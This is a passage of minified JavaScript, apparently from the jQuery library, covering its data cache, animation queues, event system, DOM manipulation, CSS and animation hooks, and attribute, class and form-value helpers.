r},get:function(e,t){return void 0===t?this.cache(e):e[this.expando]&&e[this.expando][h(t)]},access:function(e,t,n){return void 0===t||t&&"string"==typeof t&&void 0===n?this.get(e,t):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,o=e[this.expando];if(void 0!==o){if(void 0!==t){n=(t=Array.isArray(t)?t.map(h):(t=h(t))in o?[t]:t.match(Ae)||[]).length;for(;n--;)delete o[t[n]]}(void 0===t||we.isEmptyObject(o))&&(e.nodeType?e[this.expando]=void 0:delete e[this.expando])}},hasData:function(e){var t=e[this.expando];return void 0!==t&&!we.isEmptyObject(t)}};var Fe=new m,He=new m,qe=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,Be=/[A-Z]/g;we.extend({hasData:function(e){return He.hasData(e)||Fe.hasData(e)},data:function(e,t,n){return He.access(e,t,n)},removeData:function(e,t){He.remove(e,t)},_data:function(e,t,n){return Fe.access(e,t,n)},_removeData:function(e,t){Fe.remove(e,t)}}),we.fn.extend({data:function(e,t){var n,o,r,i=this[0],a=i&&i.attributes;if(void 0===e){if(this.length&&(r=He.get(i),1===i.nodeType&&!Fe.get(i,"hasDataAttrs"))){for(n=a.length;n--;)a[n]&&0===(o=a[n].name).indexOf("data-")&&(o=h(o.slice(5)),y(i,o,r[o]));Fe.set(i,"hasDataAttrs",!0)}return r}return"object"==typeof e?this.each(function(){He.set(this,e)}):Ie(this,function(t){var n;if(i&&void 0===t){if(void 0!==(n=He.get(i,e)))return n;if(void 0!==(n=y(i,e)))return n}else this.each(function(){He.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){He.remove(this,e)})}}),we.extend({queue:function(e,t,n){var o;if(e)return t=(t||"fx")+"queue",o=Fe.get(e,t),n&&(!o||Array.isArray(n)?o=Fe.access(e,t,we.makeArray(n)):o.push(n)),o||[]},dequeue:function(e,t){t=t||"fx";var n=we.queue(e,t),o=n.length,r=n.shift(),i=we._queueHooks(e,t),a=function(){we.dequeue(e,t)};"inprogress"===r&&(r=n.shift(),o--),r&&("fx"===t&&n.unshift("inprogress"),delete i.stop,r.call(e,a,i)),!o&&i&&i.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return Fe.get(e,n)||Fe.access(e,n,{empty:we.Callbacks("once memory").add(function(){Fe.remove(e,[t+"queue",n])})})}}),we.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),arguments.length<n?we.queue(this[0],e):void 0===t?this:this.each(function(){var n=we.queue(this,e,t);we._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&we.dequeue(this,e)})},dequeue:function(e){return this.each(function(){we.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,o=1,r=we.Deferred(),i=this,a=this.length,s=function(){--o||r.resolveWith(i,[i])};for("string"!=typeof e&&(t=e,e=void 0),e=e||"fx";a--;)(n=Fe.get(i[a],e+"queueHooks"))&&n.empty&&(o++,n.empty.add(s));return s(),r.promise(t)}});var $e=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,We=new RegExp("^(?:([+-])=|)("+$e+")([a-z%]*)$","i"),Ge=["Top","Right","Bottom","Left"],Ue=function(e,t){return"none"===(e=t||e).style.display||""===e.style.display&&we.contains(e.ownerDocument,e)&&"none"===we.css(e,"display")},Je=function(e,t,n,o){var r,i,a={};for(i in t)a[i]=e.style[i],e.style[i]=t[i];for(i in r=n.apply(e,o||[]),t)e.style[i]=a[i];return r},Ze={};we.fn.extend({show:function(){return v(this,!0)},hide:function(){return v(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){Ue(this)?we(this).show():we(this).hide()})}});var Xe=/^(?:checkbox|radio)$/i,Ve=/<([a-z][^\/\0>\x20\t\r\n\f]+)/i,Qe=/^$|^module$|\/(?:java|ecma)script/i,Ye={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};Ye.optgroup=Ye.option,Ye.tbody=Ye.tfoot=Ye.colgroup=Ye.caption=Ye.thead,Ye.th=Ye.td;var Ke=/<|&#?\w+;/;!function(){var e=ae.createDocumentFragment().appendChild(ae.createElement("div")),t=ae.createElement("input");t.setAttribute("type","radio"),t.setAttribute("checked","checked"),t.setAttribute("name","t"),e.appendChild(t),ye.checkClone=e.cloneNode(!0).cloneNode(!0).lastChild.checked,e.innerHTML="<textarea>x</textarea>",ye.noCloneChecked=!!e.cloneNode(!0).lastChild.defaultValue}();var et=ae.documentElement,tt=/^key/,nt=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,ot=/^([^.]*)(?:\.(.+)|)/;we.event={global:{},add:function(e,t,n,o,r){var i,a,s,l,d,c,u,p,f,h,m,g=Fe.get(e);if(g)for(n.handler&&(n=(i=n).handler,r=i.selector),r&&we.find.matchesSelector(et,r),n.guid||(n.guid=we.guid++),(l=g.events)||(l=g.events={}),(a=g.handle)||(a=g.handle=function(t){return void 0!==we&&we.event.triggered!==t.type?we.event.dispatch.apply(e,arguments):void 0}),d=(t=(t||"").match(Ae)||[""]).length;d--;)f=m=(s=ot.exec(t[d])||[])[1],h=(s[2]||"").split(".").sort(),f&&(u=we.event.special[f]||{},f=(r?u.delegateType:u.bindType)||f,u=we.event.special[f]||{},c=we.extend({type:f,origType:m,data:o,handler:n,guid:n.guid,selector:r,needsContext:r&&we.expr.match.needsContext.test(r),namespace:h.join(".")},i),(p=l[f])||((p=l[f]=[]).delegateCount=0,u.setup&&!1!==u.setup.call(e,o,h,a)||e.addEventListener&&e.addEventListener(f,a)),u.add&&(u.add.call(e,c),c.handler.guid||(c.handler.guid=n.guid)),r?p.splice(p.delegateCount++,0,c):p.push(c),we.event.global[f]=!0)},remove:function(e,t,n,o,r){var i,a,s,l,d,c,u,p,f,h,m,g=Fe.hasData(e)&&Fe.get(e);if(g&&(l=g.events)){for(d=(t=(t||"").match(Ae)||[""]).length;d--;)if(f=m=(s=ot.exec(t[d])||[])[1],h=(s[2]||"").split(".").sort(),f){for(u=we.event.special[f]||{},p=l[f=(o?u.delegateType:u.bindType)||f]||[],s=s[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),a=i=p.length;i--;)c=p[i],!r&&m!==c.origType||n&&n.guid!==c.guid||s&&!s.test(c.namespace)||o&&o!==c.selector&&("**"!==o||!c.selector)||(p.splice(i,1),c.selector&&p.delegateCount--,u.remove&&u.remove.call(e,c));a&&!p.length&&(u.teardown&&!1!==u.teardown.call(e,h,g.handle)||we.removeEvent(e,f,g.handle),delete l[f])}else for(f in l)we.event.remove(e,f+t[d],n,o,!0);we.isEmptyObject(l)&&Fe.remove(e,"handle events")}},dispatch:function(e){var t,n,o,r,i,a,s=we.event.fix(e),l=new Array(arguments.length),d=(Fe.get(this,"events")||{})[s.type]||[],c=we.event.special[s.type]||{};for(l[0]=s,t=1;t<arguments.length;t++)l[t]=arguments[t];if(s.delegateTarget=this,!c.preDispatch||!1!==c.preDispatch.call(this,s)){for(a=we.event.handlers.call(this,s,d),t=0;(r=a[t++])&&!s.isPropagationStopped();)for(s.currentTarget=r.elem,n=0;(i=r.handlers[n++])&&!s.isImmediatePropagationStopped();)s.rnamespace&&!s.rnamespace.test(i.namespace)||(s.handleObj=i,s.data=i.data,void 0!==(o=((we.event.special[i.origType]||{}).handle||i.handler).apply(r.elem,l))&&!1===(s.result=o)&&(s.preventDefault(),s.stopPropagation()));return c.postDispatch&&c.postDispatch.call(this,s),s.result}},handlers:function(e,t){var n,o,r,i,a,s=[],l=t.delegateCount,d=e.target;if(l&&d.nodeType&&!("click"===e.type&&e.button>=1))for(;d!==this;d=d.parentNode||this)if(1===d.nodeType&&("click"!==e.type||!0!==d.disabled)){for(i=[],a={},n=0;n<l;n++)void 0===a[r=(o=t[n]).selector+" "]&&(a[r]=o.needsContext?we(r,this).index(d)>-1:we.find(r,this,null,[d]).length),a[r]&&i.push(o);i.length&&s.push({elem:d,handlers:i})}return d=this,l<t.length&&s.push({elem:d,handlers:t.slice(l)}),s},addProp:function(e,t){Object.defineProperty(we.Event.prototype,e,{enumerable:!0,configurable:!0,get:be(t)?function(){if(this.originalEvent)return t(this.originalEvent)}:function(){if(this.originalEvent)return this.originalEvent[e]},set:function(t){Object.defineProperty(this,e,{enumerable:!0,configurable:!0,writable:!0,value:t})}})},fix:function(e){return e[we.expando]?e:new we.Event(e)},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==C()&&this.focus)return this.focus(),!1},delegateType:"focusin"},blur:{trigger:function(){if(this===C()&&this.blur)return this.blur(),!1},delegateType:"focusout"},click:{trigger:function(){if("checkbox"===this.type&&this.click&&i(this,"input"))return this.click(),!1},_default:function(e){return i(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}}},we.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n)},we.Event=function(e,t){if(!(this instanceof we.Event))return new we.Event(e,t);e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&!1===e.returnValue?E:T,this.target=e.target&&3===e.target.nodeType?e.target.parentNode:e.target,this.currentTarget=e.currentTarget,this.relatedTarget=e.relatedTarget):this.type=e,t&&we.extend(this,t),this.timeStamp=e&&e.timeStamp||Date.now(),this[we.expando]=!0},we.Event.prototype={constructor:we.Event,isDefaultPrevented:T,isPropagationStopped:T,isImmediatePropagationStopped:T,isSimulated:!1,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=E,e&&!this.isSimulated&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=E,e&&!this.isSimulated&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=E,e&&!this.isSimulated&&e.stopImmediatePropagation(),this.stopPropagation()}},we.each({altKey:!0,bubbles:!0,cancelable:!0,changedTouches:!0,ctrlKey:!0,detail:!0,eventPhase:!0,metaKey:!0,pageX:!0,pageY:!0,shiftKey:!0,view:!0,char:!0,charCode:!0,key:!0,keyCode:!0,button:!0,buttons:!0,clientX:!0,clientY:!0,offsetX:!0,offsetY:!0,pointerId:!0,pointerType:!0,screenX:!0,screenY:!0,targetTouches:!0,toElement:!0,touches:!0,which:function(e){var t=e.button;return null==e.which&&tt.test(e.type)?null!=e.charCode?e.charCode:e.keyCode:!e.which&&void 0!==t&&nt.test(e.type)?1&t?1:2&t?3:4&t?2:0:e.which}},we.event.addProp),we.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){we.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,o=this,r=e.relatedTarget,i=e.handleObj;return r&&(r===o||we.contains(o,r))||(e.type=i.origType,n=i.handler.apply(this,arguments),e.type=t),n}}}),we.fn.extend({on:function(e,t,n,o){return S(this,e,t,n,o)},one:function(e,t,n,o){return S(this,e,t,n,o,1)},off:function(e,t,n){var o,r;if(e&&e.preventDefault&&e.handleObj)return o=e.handleObj,we(e.delegateTarget).off(o.namespace?o.origType+"."+o.namespace:o.origType,o.selector,o.handler),this;if("object"==typeof e){for(r in e)this.off(r,t,e[r]);return this}return!1!==t&&"function"!=typeof t||(n=t,t=void 0),!1===n&&(n=T),this.each(function(){we.event.remove(this,e,n,t)})}});var rt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,it=/<script|<style|<link/i,at=/checked\s*(?:[^=]|=\s*.checked.)/i,st=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;we.extend({htmlPrefilter:function(e){return e.replace(rt,"<$1></$2>")},clone:function(e,t,n){var o,r,i,a,s=e.cloneNode(!0),l=we.contains(e.ownerDocument,e);if(!(ye.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||we.isXMLDoc(e)))for(a=w(s),o=0,r=(i=w(e)).length;o<r;o++)A(i[o],a[o]);if(t)if(n)for(i=i||w(e),a=a||w(s),o=0,r=i.length;o<r;o++)M(i[o],a[o]);else M(e,s);return(a=w(s,"script")).length>0&&_(a,!l&&w(e,"script")),s},cleanData:function(e){for(var t,n,o,r=we.event.special,i=0;void 0!==(n=e[i]);i++)if(Re(n)){if(t=n[Fe.expando]){if(t.events)for(o in t.events)r[o]?we.event.remove(n,o):we.removeEvent(n,o,t.handle);n[Fe.expando]=void 0}n[He.expando]&&(n[He.expando]=void 0)}}}),we.fn.extend({detach:function(e){return N(this,e,!0)},remove:function(e){return N(this,e)},text:function(e){return Ie(this,function(e){return void 0===e?we.text(this):this.empty().each(function(){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||(this.textContent=e)})},null,e,arguments.length)},append:function(){return L(this,arguments,function(e){1!==this.nodeType&&11!==this.nodeType&&9!==this.nodeType||j(this,e).appendChild(e)})},prepend:function(){return L(this,arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=j(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return L(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return L(this,arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(we.cleanData(w(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null!=e&&e,t=null==t?e:t,this.map(function(){return we.clone(this,e,t)})},html:function(e){return Ie(this,function(e){var t=this[0]||{},n=0,o=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!it.test(e)&&!Ye[(Ve.exec(e)||["",""])[1].toLowerCase()]){e=we.htmlPrefilter(e);try{for(;n<o;n++)1===(t=this[n]||{}).nodeType&&(we.cleanData(w(t,!1)),t.innerHTML=e);t=0}catch(e){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=[];return L(this,arguments,function(t){var n=this.parentNode;we.inArray(this,e)<0&&(we.cleanData(w(this)),n&&n.replaceChild(t,this))},e)}
}),we.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){we.fn[e]=function(e){for(var n,o=[],r=we(e),i=r.length-1,a=0;a<=i;a++)n=a===i?this:this.clone(!0),we(r[a])[t](n),ce.apply(o,n.get());return this.pushStack(o)}});var lt=new RegExp("^("+$e+")(?!px)[a-z%]+$","i"),dt=function(t){var n=t.ownerDocument.defaultView;return n&&n.opener||(n=e),n.getComputedStyle(t)},ct=new RegExp(Ge.join("|"),"i");!function(){function t(){if(d){l.style.cssText="position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0",d.style.cssText="position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%",et.appendChild(l).appendChild(d);var t=e.getComputedStyle(d);o="1%"!==t.top,s=12===n(t.marginLeft),d.style.right="60%",a=36===n(t.right),r=36===n(t.width),d.style.position="absolute",i=36===d.offsetWidth||"absolute",et.removeChild(l),d=null}}function n(e){return Math.round(parseFloat(e))}var o,r,i,a,s,l=ae.createElement("div"),d=ae.createElement("div");d.style&&(d.style.backgroundClip="content-box",d.cloneNode(!0).style.backgroundClip="",ye.clearCloneStyle="content-box"===d.style.backgroundClip,we.extend(ye,{boxSizingReliable:function(){return t(),r},pixelBoxStyles:function(){return t(),a},pixelPosition:function(){return t(),o},reliableMarginLeft:function(){return t(),s},scrollboxSize:function(){return t(),i}}))}();var ut=/^(none|table(?!-c[ea]).+)/,pt=/^--/,ft={position:"absolute",visibility:"hidden",display:"block"},ht={letterSpacing:"0",fontWeight:"400"},mt=["Webkit","Moz","ms"],gt=ae.createElement("div").style;we.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=I(e,"opacity");return""===n?"1":n}}}},cssNumber:{animationIterationCount:!0,columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{},style:function(e,t,n,o){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var r,i,a,s=h(t),l=pt.test(t),d=e.style;if(l||(t=R(s)),a=we.cssHooks[t]||we.cssHooks[s],void 0===n)return a&&"get"in a&&void 0!==(r=a.get(e,!1,o))?r:d[t];"string"==(i=typeof n)&&(r=We.exec(n))&&r[1]&&(n=b(e,t,r),i="number"),null!=n&&n==n&&("number"===i&&(n+=r&&r[3]||(we.cssNumber[s]?"":"px")),ye.clearCloneStyle||""!==n||0!==t.indexOf("background")||(d[t]="inherit"),a&&"set"in a&&void 0===(n=a.set(e,n,o))||(l?d.setProperty(t,n):d[t]=n))}},css:function(e,t,n,o){var r,i,a,s=h(t);return pt.test(t)||(t=R(s)),(a=we.cssHooks[t]||we.cssHooks[s])&&"get"in a&&(r=a.get(e,!0,n)),void 0===r&&(r=I(e,t,o)),"normal"===r&&t in ht&&(r=ht[t]),""===n||n?(i=parseFloat(r),!0===n||isFinite(i)?i||0:r):r}}),we.each(["height","width"],function(e,t){we.cssHooks[t]={get:function(e,n,o){if(n)return!ut.test(we.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?q(e,t,o):Je(e,ft,function(){return q(e,t,o)})},set:function(e,n,o){var r,i=dt(e),a="border-box"===we.css(e,"boxSizing",!1,i),s=o&&H(e,t,o,a,i);return a&&ye.scrollboxSize()===i.position&&(s-=Math.ceil(e["offset"+t[0].toUpperCase()+t.slice(1)]-parseFloat(i[t])-H(e,t,"border",!1,i)-.5)),s&&(r=We.exec(n))&&"px"!==(r[3]||"px")&&(e.style[t]=n,n=we.css(e,t)),F(e,n,s)}}}),we.cssHooks.marginLeft=O(ye.reliableMarginLeft,function(e,t){if(t)return(parseFloat(I(e,"marginLeft"))||e.getBoundingClientRect().left-Je(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),we.each({margin:"",padding:"",border:"Width"},function(e,t){we.cssHooks[e+t]={expand:function(n){for(var o=0,r={},i="string"==typeof n?n.split(" "):[n];o<4;o++)r[e+Ge[o]+t]=i[o]||i[o-2]||i[0];return r}},"margin"!==e&&(we.cssHooks[e+t].set=F)}),we.fn.extend({css:function(e,t){return Ie(this,function(e,t,n){var o,r,i={},a=0;if(Array.isArray(t)){for(o=dt(e),r=t.length;a<r;a++)i[t[a]]=we.css(e,t[a],!1,o);return i}return void 0!==n?we.style(e,t,n):we.css(e,t)},e,t,arguments.length>1)}}),we.Tween=B,B.prototype={constructor:B,init:function(e,t,n,o,r,i){this.elem=e,this.prop=n,this.easing=r||we.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=o,this.unit=i||(we.cssNumber[n]?"":"px")},cur:function(){var e=B.propHooks[this.prop];return e&&e.get?e.get(this):B.propHooks._default.get(this)},run:function(e){var t,n=B.propHooks[this.prop];return this.options.duration?this.pos=t=we.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):B.propHooks._default.set(this),this}},B.prototype.init.prototype=B.prototype,B.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=we.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){we.fx.step[e.prop]?we.fx.step[e.prop](e):1!==e.elem.nodeType||null==e.elem.style[we.cssProps[e.prop]]&&!we.cssHooks[e.prop]?e.elem[e.prop]=e.now:we.style(e.elem,e.prop,e.now+e.unit)}}},B.propHooks.scrollTop=B.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},we.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},we.fx=B.prototype.init,we.fx.step={};var yt,bt,xt=/^(?:toggle|show|hide)$/,vt=/queueHooks$/;we.Animation=we.extend(X,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return b(n.elem,e,We.exec(t),n),n}]},tweener:function(e,t){be(e)?(t=e,e=["*"]):e=e.match(Ae);for(var n,o=0,r=e.length;o<r;o++)n=e[o],X.tweeners[n]=X.tweeners[n]||[],X.tweeners[n].unshift(t)},prefilters:[J],prefilter:function(e,t){t?X.prefilters.unshift(e):X.prefilters.push(e)}}),we.speed=function(e,t,n){var o=e&&"object"==typeof e?we.extend({},e):{complete:n||!n&&t||be(e)&&e,duration:e,easing:n&&t||t&&!be(t)&&t};return we.fx.off?o.duration=0:"number"!=typeof o.duration&&(o.duration in we.fx.speeds?o.duration=we.fx.speeds[o.duration]:o.duration=we.fx.speeds._default),null!=o.queue&&!0!==o.queue||(o.queue="fx"),o.old=o.complete,o.complete=function(){be(o.old)&&o.old.call(this),o.queue&&we.dequeue(this,o.queue)},o},we.fn.extend({fadeTo:function(e,t,n,o){return this.filter(Ue).css("opacity",0).show().end().animate({opacity:t},e,n,o)},animate:function(e,t,n,o){var r=we.isEmptyObject(e),i=we.speed(t,n,o),a=function(){var t=X(this,we.extend({},e),i);(r||Fe.get(this,"finish"))&&t.stop(!0)};return a.finish=a,r||!1===i.queue?this.each(a):this.queue(i.queue,a)},stop:function(e,t,n){var o=function(e){var t=e.stop;delete e.stop,t(n)};return"string"!=typeof e&&(n=t,t=e,e=void 0),t&&!1!==e&&this.queue(e||"fx",[]),this.each(function(){var t=!0,r=null!=e&&e+"queueHooks",i=we.timers,a=Fe.get(this);if(r)a[r]&&a[r].stop&&o(a[r]);else for(r in a)a[r]&&a[r].stop&&vt.test(r)&&o(a[r]);for(r=i.length;r--;)i[r].elem!==this||null!=e&&i[r].queue!==e||(i[r].anim.stop(n),t=!1,i.splice(r,1));!t&&n||we.dequeue(this,e)})},finish:function(e){return!1!==e&&(e=e||"fx"),this.each(function(){var t,n=Fe.get(this),o=n[e+"queue"],r=n[e+"queueHooks"],i=we.timers,a=o?o.length:0;for(n.finish=!0,we.queue(this,e,[]),r&&r.stop&&r.stop.call(this,!0),t=i.length;t--;)i[t].elem===this&&i[t].queue===e&&(i[t].anim.stop(!0),i.splice(t,1));for(t=0;t<a;t++)o[t]&&o[t].finish&&o[t].finish.call(this);delete n.finish})}}),we.each(["toggle","show","hide"],function(e,t){var n=we.fn[t];we.fn[t]=function(e,o,r){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(G(t,!0),e,o,r)}}),we.each({slideDown:G("show"),slideUp:G("hide"),slideToggle:G("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){we.fn[e]=function(e,n,o){return this.animate(t,e,n,o)}}),we.timers=[],we.fx.tick=function(){var e,t=0,n=we.timers;for(yt=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||we.fx.stop(),yt=void 0},we.fx.timer=function(e){we.timers.push(e),we.fx.start()},we.fx.interval=13,we.fx.start=function(){bt||(bt=!0,$())},we.fx.stop=function(){bt=null},we.fx.speeds={slow:600,fast:200,_default:400},we.fn.delay=function(t,n){return t=we.fx&&we.fx.speeds[t]||t,n=n||"fx",this.queue(n,function(n,o){var r=e.setTimeout(n,t);o.stop=function(){e.clearTimeout(r)}})},function(){var e=ae.createElement("input"),t=ae.createElement("select").appendChild(ae.createElement("option"));e.type="checkbox",ye.checkOn=""!==e.value,ye.optSelected=t.selected,(e=ae.createElement("input")).value="t",e.type="radio",ye.radioValue="t"===e.value}();var wt,_t=we.expr.attrHandle;we.fn.extend({attr:function(e,t){return Ie(this,we.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){we.removeAttr(this,e)})}}),we.extend({attr:function(e,t,n){var o,r,i=e.nodeType;if(3!==i&&8!==i&&2!==i)return"undefined"==typeof e.getAttribute?we.prop(e,t,n):(1===i&&we.isXMLDoc(e)||(r=we.attrHooks[t.toLowerCase()]||(we.expr.match.bool.test(t)?wt:void 0)),void 0!==n?null===n?void we.removeAttr(e,t):r&&"set"in r&&void 0!==(o=r.set(e,n,t))?o:(e.setAttribute(t,n+""),n):r&&"get"in r&&null!==(o=r.get(e,t))?o:null==(o=we.find.attr(e,t))?void 0:o)},attrHooks:{type:{set:function(e,t){if(!ye.radioValue&&"radio"===t&&i(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,o=0,r=t&&t.match(Ae);if(r&&1===e.nodeType)for(;n=r[o++];)e.removeAttribute(n)}}),wt={set:function(e,t,n){return!1===t?we.removeAttr(e,n):e.setAttribute(n,n),n}},we.each(we.expr.match.bool.source.match(/\w+/g),function(e,t){var n=_t[t]||we.find.attr;_t[t]=function(e,t,o){var r,i,a=t.toLowerCase();return o||(i=_t[a],_t[a]=r,r=null!=n(e,t,o)?a:null,_t[a]=i),r}});var kt=/^(?:input|select|textarea|button)$/i,Et=/^(?:a|area)$/i;we.fn.extend({prop:function(e,t){return Ie(this,we.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[we.propFix[e]||e]})}}),we.extend({prop:function(e,t,n){var o,r,i=e.nodeType;if(3!==i&&8!==i&&2!==i)return 1===i&&we.isXMLDoc(e)||(t=we.propFix[t]||t,r=we.propHooks[t]),void 0!==n?r&&"set"in r&&void 0!==(o=r.set(e,n,t))?o:e[t]=n:r&&"get"in r&&null!==(o=r.get(e,t))?o:e[t]},propHooks:{tabIndex:{get:function(e){var t=we.find.attr(e,"tabindex");return t?parseInt(t,10):kt.test(e.nodeName)||Et.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),ye.optSelected||(we.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),we.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){we.propFix[this.toLowerCase()]=this}),we.fn.extend({addClass:function(e){var t,n,o,r,i,a,s,l=0;if(be(e))return this.each(function(t){we(this).addClass(e.call(this,t,Q(this)))});if((t=Y(e)).length)for(;n=this[l++];)if(r=Q(n),o=1===n.nodeType&&" "+V(r)+" "){for(a=0;i=t[a++];)o.indexOf(" "+i+" ")<0&&(o+=i+" ");r!==(s=V(o))&&n.setAttribute("class",s)}return this},removeClass:function(e){var t,n,o,r,i,a,s,l=0;if(be(e))return this.each(function(t){we(this).removeClass(e.call(this,t,Q(this)))});if(!arguments.length)return this.attr("class","");if((t=Y(e)).length)for(;n=this[l++];)if(r=Q(n),o=1===n.nodeType&&" "+V(r)+" "){for(a=0;i=t[a++];)for(;o.indexOf(" "+i+" ")>-1;)o=o.replace(" "+i+" "," ");r!==(s=V(o))&&n.setAttribute("class",s)}return this},toggleClass:function(e,t){var n=typeof e,o="string"===n||Array.isArray(e);return"boolean"==typeof t&&o?t?this.addClass(e):this.removeClass(e):be(e)?this.each(function(n){we(this).toggleClass(e.call(this,n,Q(this),t),t)}):this.each(function(){var t,r,i,a;if(o)for(r=0,i=we(this),a=Y(e);t=a[r++];)i.hasClass(t)?i.removeClass(t):i.addClass(t);else void 0!==e&&"boolean"!==n||((t=Q(this))&&Fe.set(this,"__className__",t),this.setAttribute&&this.setAttribute("class",t||!1===e?"":Fe.get(this,"__className__")||""))})},hasClass:function(e){var t,n,o=0;for(t=" "+e+" ";n=this[o++];)if(1===n.nodeType&&(" "+V(Q(n))+" ").indexOf(t)>-1)return!0;return!1}});var Tt=/\r/g;we.fn.extend({val:function(e){var t,n,o,r=this[0];return arguments.length?(o=be(e),this.each(function(n){var r;1===this.nodeType&&(null==(r=o?e.call(this,n,we(this).val()):e)?r="":"number"==typeof r?r+="":Array.isArray(r)&&(r=we.map(r,function(e){return null==e?"":e+""})),(t=we.valHooks[this.type]||we.valHooks[this.nodeName.toLowerCase()])&&"set"in t&&void 0!==t.set(this,r,"value")||(this.value=r))})):r?(t=we.valHooks[r.type]||we.valHooks[r.nodeName.toLowerCase()])&&"get"in t&&void 0!==(n=t.get(r,"value"))?n:"string"==typeof(n=r.value)?n.replace(Tt,""):null==n?"":n:void 0}}),we.extend({valHooks:{option:{get:function(e){var t=we.find.attr(e,"value");return null!=t?t:V(we.text(e))}},select:{get:function(e){var t,n,o,r=e.options,a=e.selectedIndex,s="select-one"===e.type,l=s?null:[],d=s?a+1:r.length;for(o=a<0?d:s?a:0;o<d;o++)if(((n=r[o]).selected||o===a)&&!n.disabled&&(!n.parentNode.disabled||!i(n.parentNode,"optgroup"))){if(t=we(n).val(),s)return t;l.push(t)}return l},set:function(e,t){for(var n,o,r=e.options,i=we.makeArray(t),a=r.length;a--;)((o=r[a]).selected=we.inArray(we.valHooks.option.get(o),i)>-1)&&(n=!0);return n||(e.selectedIndex=-1),i}}}}),we.each(["radio","checkbox"],function(){we.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=we.inArray(we(e).val(),t)>-1}},ye.checkOn||(we.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),ye.focusin="onfocusin"in e;var Ct=/^(?:focusinfocus|focusoutblur)$/,St=function(e){e.stopPropagation()};we.extend(we.event,{trigger:function(t,n,o,r){var 